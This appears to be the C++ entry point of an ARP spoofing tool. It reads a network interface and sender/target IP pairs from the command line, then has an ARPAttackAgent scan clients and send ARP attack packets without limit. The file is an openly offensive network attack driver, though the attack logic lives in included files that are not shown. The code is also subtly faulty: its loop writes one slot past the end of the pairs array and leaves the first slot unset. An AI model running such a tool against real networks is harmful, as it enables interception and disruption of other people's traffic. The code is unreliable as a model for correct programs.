#include <iostream>
#include "network/NetTools.cpp"
#include "network/ARPAttackAgent.cpp"


int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: Failed load network protocol..." << std::endl;
        return 1;
    } else std::cout << "INFO: network interface at " << argv[1] << std::endl;

    int pair_count = argc / 2 - 1;
    std::pair<uint8_t*, uint8_t*> pairs[pair_count];
    if (argc == 2) {
    } else {
        for (int i = 1; pair_count + 1 > i; i++) {
            auto senderIP = NetTools::strToIP(argv[i*2]);
            auto targetIp = NetTools::strToIP(argv[i*2+1]);
            if (!senderIP or !targetIp) {
                std::cout << "WARNING: invalied session pair : " << argv[i*2] << argv[i*2+1] << std::endl;
                return 1;
            }
            pairs[i] = std::make_pair(senderIP.value(), targetIp.value());
        }
    }

    char* netInterface = argv[1];

    auto arpAttackAgent = ARPAttackAgent(netInterface, pairs);
    arpAttackAgent.scanClients();
    arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
    return 0;
}
